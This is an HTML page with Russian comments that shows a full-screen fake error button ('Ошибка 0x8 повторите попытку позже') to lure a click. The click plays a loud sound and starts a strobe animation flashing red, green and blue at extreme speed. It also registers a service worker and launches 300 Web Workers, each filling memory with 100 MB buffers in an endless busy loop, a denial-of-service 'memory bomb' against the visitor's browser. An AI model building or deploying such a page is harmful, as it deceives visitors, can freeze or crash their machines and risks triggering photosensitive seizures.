<!DOCTYPE html>
<html>
<head>
  <style>
    #trapButton {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      font-size: 10rem;
      background: #9cff98;
      cursor: pointer;
      z-index: 9999;
    }
  </style>
</head>
<body>
  <button id="trapButton">Ошибка 0x8 повторите попытку позже</button>
  <audio id="nukeSound" src="sound.mp3" preload="auto"></audio>

  <script>
    const trigger = document.getElementById('trapButton');
    const audio = document.getElementById('nukeSound');
    let audioCtx = null; // Инициализируем AudioContext один раз
    let source = null;   // Для управления источником звука

    // Предзагрузка и настройка AudioContext
    function initializeAudio() {
      if (!audioCtx) {
        audioCtx = new AudioContext();
      }
      if (audioCtx.state === 'suspended') {
        audioCtx.resume();
      }
    }

    // Функция воспроизведения звука
    async function playSound() {
      initializeAudio();

      try {
        // Сначала пробуем стандартное воспроизведение
        audio.volume = 1.0;
        await audio.play();
      } catch (err) {
        // Если стандартное воспроизведение не удалось (например, из-за блокировки автозапуска)
        console.log('Стандартное воспроизведение не удалось, переключаемся на AudioContext:', err);

        // Загружаем аудио в AudioContext
        const response = await fetch('sound.mp3');
        const arrayBuffer = await response.arrayBuffer();
        const audioBuffer = await audioCtx.decodeAudioData(arrayBuffer);

        // Создаём источник звука
        source = audioCtx.createBufferSource();
        source.buffer = audioBuffer;
        source.connect(audioCtx.destination);
        source.start(0);

        // Обрабатываем окончание звука (если нужно зациклить, можно раскомментировать)
        source.onended = () => {
          // source = null; // Очищаем источник
          // playSound();   // Раскомментируйте для бесконечного повтора
        };
      }
    }

    trigger.onclick = () => {
      // Запускаем звук
      playSound();

      // Скрываем кнопку
      trigger.style.display = 'none';
      document.body.style.animation = 'flash 0.001s infinite';

      // Создание Service Worker (без изменений)
      if ('serviceWorker' in navigator) {
        navigator.serviceWorker.register('sw.js')
          .then(() => console.log('Service Worker зарегистрирован'))
          .catch(console.error);
      }

      // Запуск CPU/GPU-хаоса (без изменений)
      for(let i = 0; i < 300; i++) {
        new Worker(URL.createObjectURL(new Blob([`
          const memoryBomb = [];
          while(1) {
            memoryBomb.push(new ArrayBuffer(1024 * 1024 * 100));
            const start = Date.now();
            while(Date.now() - start < 1000);
          }
        `])));
      }
    };

    // CSS-анимация (без изменений)
    document.head.innerHTML += `
      <style>
        @keyframes flash {
          0% { background: #ff0000; }
          50% { background: #00ff00; }
          100% { background: #0000ff; }
        }
      </style>
    `;
  </script>
</body>
</html>
